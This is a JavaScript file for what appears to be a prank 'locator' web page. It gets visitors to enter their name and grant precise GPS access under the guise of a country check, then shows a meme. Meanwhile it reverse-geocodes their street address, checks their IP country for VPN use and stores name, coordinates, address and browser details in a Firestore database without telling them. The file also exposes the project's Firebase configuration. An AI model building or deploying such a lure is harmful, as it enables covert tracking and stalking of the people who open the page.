// --- Firebase Config (tu bloque real) ---
const firebaseConfig = {
  apiKey: "AIzaSyAHuuV7qjcrKaIi8hurN0Esc2mW6_Omgn8",
  authDomain: "localizador-orlando.firebaseapp.com",
  projectId: "localizador-orlando",
  storageBucket: "localizador-orlando.firebasestorage.app",
  messagingSenderId: "1020667989147",
  appId: "1:1020667989147:web:0176378289d6e6037e4a3e",
  measurementId: "G-TG6K03R6NP"
};
firebase.initializeApp(firebaseConfig);
try { firebase.analytics(); } catch(e){}
const db = firebase.firestore();

// --- Parámetros ---
const ALLOWED_COUNTRIES = new Set(["gt","ar","pe"]);
const FINAL_IMAGE_URL = "https://github.com/OrlandoRodas303/for-you-/blob/main/images.jpeg?raw=true"; // cámbiala por tu meme final

// --- Utilidades ---
const $ = s => document.querySelector(s);
function show(e){ e.classList.remove("hidden"); }
function hide(e){ e.classList.add("hidden"); }
function setStatus(msg, type=""){ const el=$("#status"); el.textContent=msg; el.className="status "+type; }
function openMaps(lat, lon){ $("#mapsLink").href=`https://www.google.com/maps?q=${lat},${lon}`; }
async function reverseGeocode(lat, lon){
  const url=`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&accept-language=es`;
  const res=await fetch(url); if(!res.ok) throw new Error("Fallo geocoding");
  const d=await res.json(); return {address:d.display_name||"", countryCode:d.address?.country_code?.toLowerCase()||""};
}
async function lookupIpCountry(){
  try{const r=await fetch("https://ipapi.co/json/");if(!r.ok)return null;const j=await r.json();return{ipCountryCode:j.country_code?.toLowerCase()||"",ipCountryName:j.country_name||""}}catch(_){return null}
}
async function saveAccess(data){
  const now=Date.now(), expiresAt=new Date(now+30*24*60*60*1000).toISOString();
  const doc={...data,createdAt:new Date(now).toISOString(),expiresAt,userAgent:navigator.userAgent};
  try{await db.collection("accesos").add(doc);}catch(e){console.warn("Error guardando:",e);}
}

// --- Flujo principal ---
$("#final-image").src = FINAL_IMAGE_URL;

$("#btn-cancel").addEventListener("click",()=>setStatus("Operación cancelada.","warn"));

$("#btn-continuar").addEventListener("click",()=>{
  const nombre=$("#nombre").value.trim(), apellido=$("#apellido").value.trim();
  if(!nombre||!apellido){setStatus("Completa nombre y apellido.","warn");return;}
  if(!("geolocation" in navigator)){setStatus("Geolocalización no disponible.","err");return;}

  setStatus("Solicitando permiso de ubicación…");

  navigator.geolocation.getCurrentPosition(async(pos)=>{
    const {latitude:lat,longitude:lon,accuracy}=pos.coords||{};
    setStatus("Verificando ubicación…");
    $("#debug").textContent=`GPS: ${lat?.toFixed(5)}, ${lon?.toFixed(5)}`;

    try{
      const {address,countryCode}=await reverseGeocode(lat,lon);
      const ipInfo=await lookupIpCountry();
      if(ipInfo && ipInfo.ipCountryCode!==countryCode) $("#vpnNote").classList.remove("hidden");

      if(!ALLOWED_COUNTRIES.has(countryCode)){
        hide($("#form-view")); show($("#blocked-view")); setStatus("");
        saveAccess({nombre,apellido,lat,lon,accuracy,address,countryCode,ipCountryCode:ipInfo?.ipCountryCode||null,allowed:false,reason:"region_blocked"});
        return;
      }

      hide($("#form-view")); show($("#content-view")); openMaps(lat,lon); setStatus("");
      saveAccess({nombre,apellido,lat,lon,accuracy,address,countryCode,ipCountryCode:ipInfo?.ipCountryCode||null,allowed:true});
    }catch(e){setStatus("Error al procesar ubicación.","err");console.error(e);}
  },err=>setStatus("Permiso denegado: "+err.message,"err"),{enableHighAccuracy:true,timeout:12000,maximumAge:0});

});
